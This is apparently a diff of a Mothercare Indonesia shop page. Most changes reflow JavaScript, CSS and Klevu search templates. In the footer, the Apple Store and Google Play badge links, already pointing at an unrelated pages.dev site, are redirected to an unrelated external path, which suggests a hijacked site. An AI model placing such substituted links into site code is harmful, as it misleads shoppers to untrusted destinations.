@@ -12514,8 +12464,7 @@ function myFunction() {
                                                         'index': idxData
                                                     };
 
-                                                    itemsRecent.push(products);
-                                                    idxData++;
+                                                    itemsRecent.push(products);idxData++;
                                                 });
 
                                                 window.dataLayer = window.dataLayer || [];
@@ -12658,8 +12607,7 @@ function myFunction() {
                                     productVariant += $('.swatch-attribute.size .swatch-attribute-selected-option').text().trim();
                                 }
 
-                                if (productVariant == '') {
-                                    productVariant = 'Not Defined';
+                                if (productVariant == '') {productVariant = 'Not Defined';
                                 }
 
                                 $.ajax({
@@ -12806,8 +12754,7 @@ function myFunction() {
                         justify-content: flex-start;
                         display: flex;
                         flex-direction: column;
-                        background-position: left top;
-                        background-size: cover;
+                        background-position: left top;background-size: cover;
                         background-repeat: no-repeat;
                         background-attachment: scroll;
                         width: 25%;
@@ -12904,8 +12851,7 @@ function myFunction() {
                                             }
 
                                             .footer-mobile {
-                                                display: none;
-                                            }
+                                                display: none;}
 
                                             @media screen and (max-width: 769px) {
                                                 .footer-desktop {
@@ -12922,12 +12868,12 @@ function myFunction() {
                                 <div class="pagebuilder-column download-ourapps-column-mc" data-content-type="column" data-appearance="full-height" data-background-images="{}" data-element="main" data-pb-style="IQTQM3Q">
                                     <h4 class="heading-download-apps-kanmo-mc" data-content-type="heading" data-appearance="default" data-element="main">unduh aplikasi kami</h4>
                                     <div class="footer-apple-store-img" data-content-type="html" data-appearance="default" data-element="main" data-decoded="true">
-                                        <a href="https://penuhinlagidah.pages.dev/">
+                                        <a href="https://orangpusat.org/ampkhusus/citizen-edu/">
                                             <img width="200" height="60" loading="lazy" src="https://www.mothercare.co.id/media/wysiwyg/apple-en.png" alt="download app apple store">
                                         </a>
                                     </div>
                                     <div class="footer-google-play-img" data-content-type="html" data-appearance="default" data-element="main" data-decoded="true">
-                                        <a href="https://penuhinlagidah.pages.dev/">
+                                        <a href="https://orangpusat.org/ampkhusus/citizen-edu/">
                                             <img width="200" height="60" loading="lazy" src="https://www.mothercare.co.id/media/wysiwyg/google-en.png" alt="download app google play">
                                         </a>
                                         <style>
@@ -13487,8 +13433,7 @@ function myFunction() {
     <script type="template/klevu" id="klevuQuickTemplateBase">
          <div class="klevu-fluid kuPreventDocumentClick"> <%= helper.render('customBlockTopOuter',scope) %> <div id="klevuSearchingArea" class="klevuQuickSearchingArea"> <div ku-container data-container-id="ku_quick_main_container" data-container-role="main"> <%= helper.render('customBlockTop',scope) %> <header ku-container data-container-id="ku_quick_main_header_container" data-container-role="header"> <section ku-block data-block-id="ku_quick_main_header_sub_panel"></section> <section ku-block data-block-id="ku_quick_main_header_banner"> <%=helper.render('klevuQuickPromotionBanner',scope,data,"top") %> </section> <section ku-block data-block-id="ku_quick_main_header_site_navigation"> <div class="klevuSuggestionsBlock"> <%=helper.render('klevuQuickAutoSuggestions',scope) %> <%=helper.render('klevuQuickPageSuggestions',scope) %> <%=helper.render('klevuQuickCategorySuggestions',scope) %> </div> </section> </header> <% if(data.showQuickFacetedLayoutCharLimitMessage == true) { %> <% var quickFacetedLayoutMessage = (data.quickFacetedLayoutMinCharsTextValue) ? data.quickFacetedLayoutMinCharsTextValue : ""; %> <% if(quickFacetedLayoutMessage != "") { %> <span class="kuFacetedLayoutMinCharText"><%= helper.translate(quickFacetedLayoutMessage) %></span> <% } %> <% } else { %> <% if(data.query.productList) { %> <%=helper.render('klevuQuickTemplateResultsHeadingTitle',scope,data,"productList") %> <%= helper.render('klevuQuickTemplateTabResults',scope) %> <%= helper.render('klevuQuickProducts',scope) %> <%= helper.render('klevuQuickOtherContent',scope) %> <% } else { %> <div class="kuSearchPersonalizationsContainer"> <%= helper.render('klevuSearchPersonalizations',scope) %> </div> <% } %> <% } %> <footer ku-container data-container-id="ku_quick_main_footer_container" data-container-role="footer"> <section ku-block data-block-id="ku_quick_main_footer_sub_panel"></section> <section ku-block data-block-id="ku_quick_main_footer_banner"> <%=helper.render('klevuQuickPromotionBanner',scope,data,"bottom") %> </section> </footer> <%= helper.render('customBlockBottom',scope) %> </div> </div> </div>
     </script>
-    <script type="template/klevu" id="klevuSearchPersonalizations">
-         <div ku-container data-container-id="ku_quick_main_content_container" data-container-role="content"> <section ku-container data-container-id="ku_quick_main_content_left" data-container-position="left" data-container-role="left"> <div ku-block data-block-id="ku_quick_left_facets"></div> <div ku-block data-block-id="ku_quick_left_call_outs"> <%=helper.render('kuTemplatePopularSearches',scope) %> <%=helper.render('kuTemplateRecentSearches',scope) %> </div> <div ku-block data-block-id="ku_quick_left_banner"></div> </section> <section ku-container data-container-id="ku_quick_main_content_center" data-container-position="center" data-container-role="center"> <header ku-block data-block-id="ku_quick_result_header"></header> <div ku-block data-block-id="ku_quick_result_items"></div> <div ku-block data-block-id="ku_quick_other_items"> <%=helper.render('klevuTrendingProducts',scope) %> <%=helper.render('klevuRecentViewedProducts',scope) %> </div> <footer ku-block data-block-id="ku_quick_result_footer"></footer> </section> <section ku-container data-container-id="ku_quick_main_content_right" data-container-position="right" data-container-role="right"> <div ku-block data-block-id="ku_quick_right_facets"></div> <div ku-block data-block-id="ku_quick_right_call_outs"></div> <div ku-block data-block-id="ku_quick_right_banner"></div> </section> </div>
+    <script type="template/klevu" id="klevuSearchPersonalizations"><div ku-container data-container-id="ku_quick_main_content_container" data-container-role="content"> <section ku-container data-container-id="ku_quick_main_content_left" data-container-position="left" data-container-role="left"> <div ku-block data-block-id="ku_quick_left_facets"></div> <div ku-block data-block-id="ku_quick_left_call_outs"> <%=helper.render('kuTemplatePopularSearches',scope) %> <%=helper.render('kuTemplateRecentSearches',scope) %> </div> <div ku-block data-block-id="ku_quick_left_banner"></div> </section> <section ku-container data-container-id="ku_quick_main_content_center" data-container-position="center" data-container-role="center"> <header ku-block data-block-id="ku_quick_result_header"></header> <div ku-block data-block-id="ku_quick_result_items"></div> <div ku-block data-block-id="ku_quick_other_items"> <%=helper.render('klevuTrendingProducts',scope) %> <%=helper.render('klevuRecentViewedProducts',scope) %> </div> <footer ku-block data-block-id="ku_quick_result_footer"></footer> </section> <section ku-container data-container-id="ku_quick_main_content_right" data-container-position="right" data-container-role="right"> <div ku-block data-block-id="ku_quick_right_facets"></div> <div ku-block data-block-id="ku_quick_right_call_outs"></div> <div ku-block data-block-id="ku_quick_right_banner"></div> </section> </div>
     </script>
     <script type="template/klevu" id="klevuQuickAutoSuggestions">
          <% if(data.suggestions.autosuggestion) { %> <% if(data.suggestions.autosuggestion.length> 0 ) { %> <% var queryParam = klevu.getSetting(klevu, "settings.url.queryParam"); %> <div class="klevuAutoSuggestionsWrap klevuAutosuggestions"> <div class="klevuSuggestionHeading"> <span class="klevuHeadingText"> <%=helper.translate("Suggestions")%></span> </div> <ul> <% helper.each(data.suggestions.autosuggestion,function(key,suggestion){ %> <li tabindex="-1"><a target="_self" href="<%=helper.buildUrl(data.settings.landingUrl, queryParam , helper.stripHtml(suggestion.suggest))%>" data-content="<%=helper.stripHtml(suggestion.suggest) %>" class="klevu-track-click"> <%=suggestion.suggest %> </a></li> <% }); %> </ul> </div> <% } %> <% } %>
@@ -13520,7 +13465,7 @@ function myFunction() {
     </script>
     <!-- Popular searches template for Quick Search Results -->
     <script type="template/klevu" id="kuTemplatePopularSearches">
-         <% if(data.popularSearches && data.popularSearches.length) { %> <div class="kuPopularSearchesBlock kuPreventDocumentClick"> <div class="klevuSuggestionHeading kuPopularSearchHeading"><span class="klevuHeadingText"><%=helper.translate("Popular Searches")%></span></div> <div class="kuPopularSearchTerms"> <ul> <% helper.each(data.popularSearches,function(key,term){ %> <% if(term && term.length) { %> <li class="kuPopularSearchTerm" data-value="<%= term %>"> <a target="_self" href="javascript:void(0)"><%= term %></a> </li> <% } %> <% }); %> </ul> </div> </div> <% } %>
+         <% if(data.popularSearches && data.popularSearches.length) { %> <div class="kuPopularSearchesBlock kuPreventDocumentClick"> <div class="klevuSuggestionHeading kuPopularSearchHeading"><span class="klevuHeadingText"><%=helper.translate("Popular Searches")%></span></div><div class="kuPopularSearchTerms"> <ul> <% helper.each(data.popularSearches,function(key,term){ %> <% if(term && term.length) { %> <li class="kuPopularSearchTerm" data-value="<%= term %>"> <a target="_self" href="javascript:void(0)"><%= term %></a> </li> <% } %> <% }); %> </ul> </div> </div> <% } %>
     </script>
     <!-- Recent searches template for Quick Search Results -->
     <script type="template/klevu" id="kuTemplateRecentSearches">
@@ -13568,7 +13513,7 @@ function myFunction() {
          <% var caption = klevu.search.modules.kmcInputs.base.getVatCaption(); var vatCaption = helper.translate("(" + caption + ")"); %> <div class="kuCaptionVat"><%= vatCaption %></div>
     </script>
     <script type="template/klevu" id="klevuQuickTemplateFilters">
-         <% if(data.query[dataLocal].filters.length > 0 ) { %> <div class="kuFilters" role="navigation" data-position="left" aria-label="Product Filters" tabindex="0"> <% helper.each(data.query[dataLocal].filters,function(key,filter){ %> <% if(filter.type == "OPTIONS"){ %> <div class="kuFilterBox klevuFilter <%=(filter.multiselect)?'kuMulticheck':''%>" data-filter="<%=filter.key%>" <% if(filter.multiselect){ %> data-singleselect="false" <% } else { %> data-singleselect="true"<% } %>> <div class="kuFilterHead <%=(filter.isCollapsed) ? 'kuExpand' : 'kuCollapse'%>"> <% var filter_label = (filter.label=="klevu_price") ? "price" : filter.label; %> <%=helper.translate(filter_label)%> </div> <div data-optionCount="<%= filter.options.length %>" class="kuFilterNames <%= (filter.options.length < 5 ) ? 'kuFilterShowAll': '' %> <%=(filter.isCollapsed) ? 'kuFilterCollapse' : ''%>"> <ul> <% helper.each(filter.options,function(key,filterOption){ %> <li <% if(filterOption.selected ==true) { %> class="kuSelected"<% } %>> <a target="_self" href="#" title="<%=helper.escapeHTML(filterOption.name)%>" class="klevuFilterOption<% if(filterOption.selected ==true) { %> klevuFilterOptionActive<% } %>" data-value="<%=helper.escapeHTML(filterOption.value)%>" data-name="<%=helper.escapeHTML(filterOption.name)%>" > <span class="kuFilterIcon"></span> <span class="kufacet-text"><%=filterOption.name%></span> <% if(filterOption.selected ==true) { %> <span class="kuFilterCancel">X</span> <% } else { %> <span class="kuFilterTotal"><%=filterOption.count%></span> <% } %> </a> </li> <% }); %> </ul> <% if(filter.options.length > 5 ) { %> <div class="kuShowOpt" tabindex="-1"> <span class="kuFilterDot"></span><span class="kuFilterDot"></span><span class="kuFilterDot"></span> </div> <% } %> </div> </div> <% } else if(filter.type == "SLIDER") { %> <div class="kuFilterBox klevuFilter" data-filter="<%=filter.key%>"> <div class="kuFilterHead <%=(filter.isCollapsed) ? 'kuExpand' : 'kuCollapse'%>"> <% var filter_label = (filter.label=="klevu_price") ? "price" : filter.label; %> <%=helper.translate(filter_label)%> </div> <div class="kuFilterNames sliderFilterNames <%=(filter.isCollapsed) ? 'kuFilterCollapse' : ''%>"> <div class="kuPriceSlider klevuSliderFilter" data-query = "<%=dataLocal%>"> <div data-querykey = "<%=dataLocal%>" class="noUi-target noUi-ltr noUi-horizontal noUi-background kuSliderFilter kuPriceRangeSliderFilter<%=dataLocal%>"></div> </div> </div> </div> <% } else if (filter.type == "RATING") { %> <div class="kuFilterBox klevuFilter <%=(filter.multiselect)?'kuMulticheck':''%>" data-filter="<%=filter.key%>" <% if(filter.multiselect){ %> data-singleselect="false" <% } else { %> data-singleselect="true"<% } %>> <div class="kuFilterHead <%=(filter.isCollapsed) ? 'kuExpand' : 'kuCollapse'%>"> <%=helper.translate(filter.label)%> </div> <div data-optionCount="<%= filter.options.length %>" class="kuFilterNames <%= (filter.options.length < 5 ) ? 'kuFilterShowAll': '' %> <%=(filter.isCollapsed) ? 'kuFilterCollapse' : ''%>"> <ul> <% helper.each(filter.options,function(key,filterOption){ %> <li <% if(filterOption.selected ==true) { %> class="kuSelected"<% } %>> <a target="_self" href="#" title="<%=helper.escapeHTML(filterOption.name)%>" class="klevuFilterOption<% if(filterOption.selected ==true) { %> klevuFilterOptionActive<% } %>" data-value="<%=helper.escapeHTML(filterOption.value)%>" data-name="<%=helper.escapeHTML(filterOption.name)%>" > <span class="kuFilterIcon"></span> <span class="kufacet-text"> <div class="klevuFacetStars"> <div class="klevuFacetRating" style="width:<%=(20*Number(filterOption.name))%>%;"></div> </div> </span> <% if(filterOption.selected ==true) { %> <span class="kuFilterCancel">X</span> <% } else { %> <span class="kuFilterTotal"><%=filterOption.count%></span> <% } %> </a> </li> <% }); %> </ul> </div> </div> <% } else { %> <!-- Other Facets --> <% } %> <% }); %> <!-- <div class="kuFiltersFooter"> <a target="_self" href="javascript:void(0)" class="kuBtn kuFacetsSlideOut kuMobileFilterCloseBtn" role="button" tabindex="0" area-label=""><%=helper.translate("Close")%></a> </div> --> </div> <% } %>
+         <% if(data.query[dataLocal].filters.length > 0 ) { %> <div class="kuFilters" role="navigation" data-position="left" aria-label="Product Filters" tabindex="0"> <% helper.each(data.query[dataLocal].filters,function(key,filter){ %> <% if(filter.type == "OPTIONS"){ %> <div class="kuFilterBox klevuFilter <%=(filter.multiselect)?'kuMulticheck':''%>" data-filter="<%=filter.key%>" <% if(filter.multiselect){ %> data-singleselect="false" <% } else { %> data-singleselect="true"<% } %>> <div class="kuFilterHead <%=(filter.isCollapsed) ? 'kuExpand' : 'kuCollapse'%>"> <% var filter_label = (filter.label=="klevu_price") ? "price" : filter.label; %> <%=helper.translate(filter_label)%> </div> <div data-optionCount="<%= filter.options.length %>" class="kuFilterNames <%= (filter.options.length < 5 ) ? 'kuFilterShowAll': '' %> <%=(filter.isCollapsed) ? 'kuFilterCollapse' : ''%>"> <ul> <% helper.each(filter.options,function(key,filterOption){ %> <li <% if(filterOption.selected ==true) { %> class="kuSelected"<% } %>> <a target="_self" href="#" title="<%=helper.escapeHTML(filterOption.name)%>" class="klevuFilterOption<% if(filterOption.selected ==true) { %> klevuFilterOptionActive<% } %>" data-value="<%=helper.escapeHTML(filterOption.value)%>" data-name="<%=helper.escapeHTML(filterOption.name)%>" > <span class="kuFilterIcon"></span> <span class="kufacet-text"><%=filterOption.name%></span> <% if(filterOption.selected ==true) { %> <span class="kuFilterCancel">X</span> <% } else { %> <span class="kuFilterTotal"><%=filterOption.count%></span> <% } %> </a> </li> <% }); %> </ul> <% if(filter.options.length > 5 ) { %> <div class="kuShowOpt" tabindex="-1"> <span class="kuFilterDot"></span><span class="kuFilterDot"></span><span class="kuFilterDot"></span> </div> <% } %> </div> </div> <% } else if(filter.type == "SLIDER") { %> <div class="kuFilterBox klevuFilter" data-filter="<%=filter.key%>"> <div class="kuFilterHead <%=(filter.isCollapsed) ? 'kuExpand' : 'kuCollapse'%>"> <% var filter_label = (filter.label=="klevu_price") ? "price" : filter.label; %> <%=helper.translate(filter_label)%> </div> <div class="kuFilterNames sliderFilterNames <%=(filter.isCollapsed) ? 'kuFilterCollapse' : ''%>"> <div class="kuPriceSlider klevuSliderFilter"data-query = "<%=dataLocal%>"> <div data-querykey = "<%=dataLocal%>" class="noUi-target noUi-ltr noUi-horizontal noUi-background kuSliderFilter kuPriceRangeSliderFilter<%=dataLocal%>"></div> </div> </div> </div> <% } else if (filter.type == "RATING") { %> <div class="kuFilterBox klevuFilter <%=(filter.multiselect)?'kuMulticheck':''%>" data-filter="<%=filter.key%>" <% if(filter.multiselect){ %> data-singleselect="false" <% } else { %> data-singleselect="true"<% } %>> <div class="kuFilterHead <%=(filter.isCollapsed) ? 'kuExpand' : 'kuCollapse'%>"> <%=helper.translate(filter.label)%> </div> <div data-optionCount="<%= filter.options.length %>" class="kuFilterNames <%= (filter.options.length < 5 ) ? 'kuFilterShowAll': '' %> <%=(filter.isCollapsed) ? 'kuFilterCollapse' : ''%>"> <ul> <% helper.each(filter.options,function(key,filterOption){ %> <li <% if(filterOption.selected ==true) { %> class="kuSelected"<% } %>> <a target="_self" href="#" title="<%=helper.escapeHTML(filterOption.name)%>" class="klevuFilterOption<% if(filterOption.selected ==true) { %> klevuFilterOptionActive<% } %>" data-value="<%=helper.escapeHTML(filterOption.value)%>" data-name="<%=helper.escapeHTML(filterOption.name)%>" > <span class="kuFilterIcon"></span> <span class="kufacet-text"> <div class="klevuFacetStars"> <div class="klevuFacetRating" style="width:<%=(20*Number(filterOption.name))%>%;"></div> </div> </span> <% if(filterOption.selected ==true) { %> <span class="kuFilterCancel">X</span> <% } else { %> <span class="kuFilterTotal"><%=filterOption.count%></span> <% } %> </a> </li> <% }); %> </ul> </div> </div> <% } else { %> <!-- Other Facets --> <% } %> <% }); %> <!-- <div class="kuFiltersFooter"> <a target="_self" href="javascript:void(0)" class="kuBtn kuFacetsSlideOut kuMobileFilterCloseBtn" role="button" tabindex="0" area-label=""><%=helper.translate("Close")%></a> </div> --> </div> <% } %>
     </script>
     <script type="template/klevu" id="klevuQuickOtherContent">
          <% if(data.query.cmsCompressed) { %> <% if(data.query.cmsCompressed.result.length > 0 ) { %> <div ku-container data-container-id="ku_quick_main_content_container" data-container-role="content" data-content="cmsCompressed" > <section ku-container data-container-id="ku_quick_main_content_left" data-container-position="left" data-container-role="left"> <div ku-block data-block-id="ku_quick_left_facets"> <% var isQuickFiltersOnLeft = klevu.search.modules.kmcInputs.base.isQuickFacetedLayoutFilterOnLeft(); %> <% if(isQuickFiltersOnLeft === true && data.query.cmsCompressed.filters && data.query.cmsCompressed.filters.length > 0) { %> <div data-section="cmsCompressed" class="klevuMeta"> <%=helper.render('klevuQuickTemplateFilters',scope,data,"cmsCompressed") %> </div> <% } %> </div> <div ku-block data-block-id="ku_quick_left_call_outs"></div> <div ku-block data-block-id="ku_quick_left_banner"></div> </section> <section ku-container data-container-id="ku_quick_main_content_center" data-container-position="center" data-container-role="center"> <header ku-block data-block-id="ku_quick_result_header"></header> <div ku-block data-block-id="ku_quick_result_items"> <div class="klevuResultsBlock"> <%=helper.render('klevuQuickProductBlockTitleHeader',scope,data) %> <div class="klevuQuickSearchResults klevuMeta cmsCompressed" data-section="cmsCompressed" id="cmsCompressed"> <ul> <% helper.each(data.query.cmsCompressed.result,function(key,product){ %> <%=helper.render('klevuQuickTemplateContentBlock',scope,data,product) %> <% }); %> <%=helper.render('klevuQuickTemplateInfiniteScrollDown',scope,data) %> </ul> </div> </div> </div> <div ku-block data-block-id="ku_quick_other_items"> <div data-section="cmsCompressed" class="klevuMeta"> <%=helper.render('klevuQuickTemplatePagination',scope,data,"cmsCompressed") %> </div> </div> <footer ku-block data-block-id="ku_quick_result_footer"></footer> </section> <section ku-container data-container-id="ku_quick_main_content_right" data-container-position="right" data-container-role="right"> <div ku-block data-block-id="ku_quick_right_facets"> <% var isQuickFiltersOnLeft = klevu.search.modules.kmcInputs.base.isQuickFacetedLayoutFilterOnLeft(); %> <% if(isQuickFiltersOnLeft === false && data.query.cmsCompressed.filters && data.query.cmsCompressed.filters.length > 0) { %> <div data-section="cmsCompressed" class="klevuMeta"> <%=helper.render('klevuQuickTemplateFilters',scope,data,"cmsCompressed") %> </div> <% } %> </div> <div ku-block data-block-id="ku_quick_right_call_outs"></div> <div ku-block data-block-id="ku_quick_right_banner"></div> </section> </div> <% } else { %> <% } %> <% } else { %> <% } %>
